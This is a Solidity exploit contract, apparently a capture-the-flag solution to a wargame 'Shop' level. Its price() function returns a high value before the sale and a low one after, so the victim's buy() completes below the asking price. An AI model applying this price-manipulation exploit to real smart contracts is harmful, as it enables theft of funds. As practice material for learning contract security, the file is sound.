// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import '../levels/Shop.sol';

contract ShopAttack {

  function price() external view returns (uint) {
    bool isSold = Shop(msg.sender).isSold();

    assembly {
        let result

        switch isSold
        case 0 {
            result := 200
        }
        default {
            result := 1
        }
        mstore(0x00, result)
        return(0x00, 0x20)
    }
  }

  function attack(Shop _victim) external {
    Shop(_victim).buy();
  }
}
